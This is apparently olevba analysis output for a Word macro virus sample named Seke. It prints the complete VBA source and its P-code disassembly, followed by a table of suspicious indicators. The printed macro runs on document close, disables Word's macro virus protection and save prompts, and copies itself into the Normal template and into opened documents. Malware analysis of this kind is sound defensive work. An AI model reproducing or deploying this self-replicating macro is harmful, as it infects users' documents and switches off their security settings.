olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Seke
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Seke - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO SEKE.bas 
in file: Virus.MSWord.Seke - OLE stream: 'Macros/VBA/SEKE'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
    On Error GoTo salir
    Application.UserAddress = "SEKE - Chiclayo"
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    Options.ConfirmConversions = False
    WordBasic.DisableAutoMacros 0
    If DocuSEKE = 0 Then
        WordBasic.MacroCopy "Global:SEKE", WordBasic.[FileName$]() + ":SEKE"
        ActiveDocument.VBProject.VBComponents.Item(DocuSEKE).CodeModule.ReplaceLine 1, "Sub AutoOpen()"
        If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
    ElseIf NormalSEKE = 0 Then
        WordBasic.MacroCopy WordBasic.[FileName$]() + ":SEKE", "Global:SEKE"
        NormalTemplate.VBProject.VBComponents.Item(NormalSEKE).CodeModule.ReplaceLine 1, "Sub AutoClose()"
        NormalTemplate.Save
    End If
    If (Day(Now) = 31 And Month(Now) = 12) Or Year(Now) >= 2000 Then
        MsgBox "Te deseo Feliz Año Nuevo " & Application.UserName & " (Año 2000) Nuevo Milenio.", vbExclamation, "SEKE - Chiclayo..."
    End If
salir:
End Sub
Private Function DocuSEKE()
    DocuSEKE = 0
    With ActiveDocument.VBProject.VBComponents
        For i = 2 To .Count
            xx = .Item(i).Name
            If xx = "SEKE" Then
                DocuSEKE = i
                Exit For
            End If
        Next i
    End With
End Function
Private Function NormalSEKE()
    NormalSEKE = 0
    With NormalTemplate.VBProject.VBComponents
        For i = 2 To .Count
            xx = .Item(i).Name
            If xx = "SEKE" Then
                NormalSEKE = i
                Exit For
            End If
        Next i
    End With
End Function

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Seke
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1182 bytes
' Macros/VBA/SEKE - 8426 bytes
' Line #0:
' 	FuncDefn (Sub AutoClose())
' Line #1:
' 	OnError salir 
' Line #2:
' 	LitStr 0x000F "SEKE - Chiclayo"
' 	Ld Application 
' 	MemSt UserAddress 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #7:
' 	Ld DocuSEKE 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #8:
' 	LitStr 0x000B "Global:SEKE"
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0005 ":SEKE"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #9:
' 	LitDI2 0x0001 
' 	LitStr 0x000E "Sub AutoOpen()"
' 	Ld DocuSEKE 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #10:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #11:
' 	Ld NormalSEKE 
' 	LitDI2 0x0000 
' 	Eq 
' 	ElseIfBlock 
' Line #12:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0005 ":SEKE"
' 	Add 
' 	LitStr 0x000B "Global:SEKE"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #13:
' 	LitDI2 0x0001 
' 	LitStr 0x000F "Sub AutoClose()"
' 	Ld NormalSEKE 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #14:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001F 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	And 
' 	Paren 
' 	Ld Now 
' 	ArgsLd Year 0x0001 
' 	LitDI2 0x07D0 
' 	Ge 
' 	Or 
' 	IfBlock 
' Line #17:
' 	LitStr 0x0019 "Te deseo Feliz Año Nuevo "
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x001A " (Año 2000) Nuevo Milenio."
' 	Concat 
' 	Ld vbExclamation 
' 	LitStr 0x0012 "SEKE - Chiclayo..."
' 	ArgsCall MsgBox 0x0003 
' Line #18:
' 	EndIfBlock 
' Line #19:
' 	Label salir 
' Line #20:
' 	EndSub 
' Line #21:
' 	FuncDefn (Private Function DocuSEKE())
' Line #22:
' 	LitDI2 0x0000 
' 	St DocuSEKE 
' Line #23:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	With 
' Line #24:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	MemLdWith Count 
' 	For 
' Line #25:
' 	Ld i 
' 	ArgsMemLdWith Item 0x0001 
' 	MemLd New 
' 	St xx 
' Line #26:
' 	Ld xx 
' 	LitStr 0x0004 "SEKE"
' 	Eq 
' 	IfBlock 
' Line #27:
' 	Ld i 
' 	St DocuSEKE 
' Line #28:
' 	ExitFor 
' Line #29:
' 	EndIfBlock 
' Line #30:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #31:
' 	EndWith 
' Line #32:
' 	EndFunc 
' Line #33:
' 	FuncDefn (Private Function NormalSEKE())
' Line #34:
' 	LitDI2 0x0000 
' 	St NormalSEKE 
' Line #35:
' 	StartWithExpr 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	With 
' Line #36:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	MemLdWith Count 
' 	For 
' Line #37:
' 	Ld i 
' 	ArgsMemLdWith Item 0x0001 
' 	MemLd New 
' 	St xx 
' Line #38:
' 	Ld xx 
' 	LitStr 0x0004 "SEKE"
' 	Eq 
' 	IfBlock 
' Line #39:
' 	Ld i 
' 	St NormalSEKE 
' Line #40:
' 	ExitFor 
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #43:
' 	EndWith 
' Line #44:
' 	EndFunc 
' Line #45:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

